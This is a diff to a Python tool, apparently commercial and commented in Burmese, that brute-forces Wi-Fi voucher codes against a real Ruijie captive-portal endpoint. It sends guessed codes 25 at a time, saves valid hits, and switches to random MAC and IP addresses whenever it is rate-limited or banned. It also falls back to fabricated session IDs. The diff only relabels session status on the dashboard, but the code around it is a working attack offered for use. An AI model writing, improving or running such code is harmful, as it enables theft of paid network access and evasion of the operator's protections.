@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Clean Dashboard & V15 Speed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Clear Session Status)
 # Part 1 of 2
 # =====================================================================
 
@@ -35,7 +35,7 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 25  # V15 Speed ရအောင် ၂၅ ခု တင်ထားသည်
+CONCURRENCY_LIMIT = 25  
 RL_SLEEP = 0.0          
 
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -172,15 +172,17 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
                         'sessionId': sid,
                         'sign': q.get('sign', [None])[0],
                         'timestamp': q.get('timestamp', [None])[0],
-                    }, "OK"
+                    }, "REAL"
     except Exception:
         pass
 
+    # မရရင် အတု
+    fake_sid = f"fake_sess_{random.randint(1000,9999)}"
     return {
-        'sessionId': f"fake_sess_{random.randint(1000,9999)}",
+        'sessionId': fake_sid,
         'sign': None,
         'timestamp': None
-    }, "Fake Session"
+    }, "FAKE"
 
 async def test_code_official(session, sess_data, code, mac, ip):
     url = RUIJIE_VOUCHER
@@ -204,7 +206,6 @@ async def test_code_official(session, sess_data, code, mac, ip):
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        # Timeout ကို ၂ စက္ကန့်ပဲ ထားလိုက်တယ် (အမြန်ဆုံးကျော်သွားအောင်)
         async with session.post(url, json=payload, headers=headers, timeout=2, ssl=False, allow_redirects=True) as r:
             if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
@@ -259,19 +260,14 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Clean Dashboard & V15 Speed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Clear Session Status)
 # Part 2 of 2
 # =====================================================================
 
-def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat):
+def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat, sess_id):
     layout = Layout()
-    
-    # ⭐ အပေါ်ဆုံးမှာ တစ်ကြောင်းတည်း ရှင်းရှင်းလင်းလင်း ရေးထားတယ်
     header_text = Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_cyan", justify="center")
-    layout.split_column(
-        Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3),
-        Layout(name="body", ratio=1)
-    )
+    layout.split_column(Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3), Layout(name="body", ratio=1))
 
     stats = Table.grid(expand=True, padding=(0, 1))
     stats.add_column(style="bold white", justify="left")
@@ -279,20 +275,32 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     stats.add_column(style="bold white", justify="left")
     stats.add_column(style="bold green", justify="left")
 
-    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() or "RETRY" in status.upper() or "FAIL" in status.upper() else "bold green"
-    sess_style = "bold green" if "REAL" in sess_stat.upper() else "bold yellow"
+    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() else "bold green"
+    
+    # ⭐ Session အခြေအနေနဲ့ ID ကို ရှင်းရှင်းလင်းလင်း ပြမယ်
+    if sess_stat == "REAL":
+        sess_text = f"REAL ({sess_id[:8]}...)"
+        sess_style = "bold green"
+    elif sess_stat == "FAKE":
+        sess_text = f"FAKE ({sess_id[:8]}...)"
+        sess_style = "bold yellow"
+    elif sess_stat == "EXPIRED":
+        sess_text = "EXPIRED (Refreshing...)"
+        sess_style = "bold red"
+    else:
+        sess_text = sess_stat
+        sess_style = "bold cyan"
 
     stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
     stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
     stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
     stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
     stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
-    stats.add_row("  💾 This Run", f": {tried_count:,}",         "  🔐 Session", f": {sess_stat.upper()}", style=sess_style) # ⭐ Session အခြေအနေ ထည့်ထားတယ်
+    stats.add_row("  💾 This Run", f": {tried_count:,}",         "  🔐 Session", f": {sess_text}", style=sess_style)
 
     stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
     check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
 
-    # ⭐ Hits Table အောက်က စာသားတွေ ဖျက်ထားတယ်
     v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
     v_table.add_column("Voucher Hits", style="bold green", justify="center")
     v_table.add_column("Plan", style="bold green", justify="center")
@@ -336,7 +344,8 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     hits, tested, start_time = [], 0, time.time()
     current_code = [""]
     current_status = ["Init"]
-    sess_stat = ["Fake Session"] # ⭐ မူလက Fake လို့ ထားမယ်
+    sess_stat = ["FAKE"] 
+    sess_id = ["--------"] # ⭐ Session ID သိမ်းဖို့
 
     current_mac = [generate_random_mac()]
     current_ip  = [generate_random_ip()]
@@ -346,8 +355,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
     async with aiohttp.ClientSession(connector=conn_limit) as session:
-        # Dashboard ကို ၁ စက္ကန့်ကို ၂ ခါပဲ Refresh လုပ်ခိုင်းလိုက်တယ် (မတုန်အောင်)
-        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0, sess_stat[0]), refresh_per_second=2, screen=False)
+        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0, sess_stat[0], sess_id[0]), refresh_per_second=2, screen=False)
 
         with live:
             try:
@@ -359,12 +367,14 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         if res == "BAN":
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            sess_stat[0] = "Banned → Spoofing"
+                            sess_stat[0] = "BANNED"
+                            sess_id[0] = "--------"
                             await asyncio.sleep(0.1)
                             continue
 
                         sess_data[0] = res
-                        sess_stat[0] = err_msg # ⭐ Session အခြေအနေ Dashboard မှာ ပြမယ်
+                        sess_stat[0] = err_msg # REAL သို့မဟုတ် FAKE
+                        sess_id[0] = res.get('sessionId', '--------') # ⭐ Session ID ကို ယူမယ်
 
                     batch_codes = []
                     while len(batch_codes) < CONCURRENCY_LIMIT:
@@ -397,7 +407,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
                         if res == "__SESSION_EXPIRED__":
                             sess_data[0] = None
-                            sess_stat[0] = "Refreshing..."
+                            sess_stat[0] = "EXPIRED" # ⭐ ကုန်သွားရင် Expired ပြမယ်
                             session_expired_in_batch = True
                             break
 
@@ -405,7 +415,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            sess_stat[0] = "Refreshing (Rate Limit)..."
+                            sess_stat[0] = "BANNED"
                             hit_found_in_batch = True
                             break
 
@@ -417,7 +427,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            sess_stat[0] = "Refreshing (Limit)..."
+                            sess_stat[0] = "BANNED"
                             hit_found_in_batch = True
                             break
 
@@ -440,14 +450,14 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            sess_stat[0] = "Refreshing (Hit!)..."
+                            sess_stat[0] = "HIT (Refreshing)"
                             hit_found_in_batch = True
                             break
 
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                     
-                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes), sess_stat[0]))
+                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes), sess_stat[0], sess_id[0]))
 
                     if hit_found_in_batch: await asyncio.sleep(0.1)
                     if session_expired_in_batch: await asyncio.sleep(0.01)
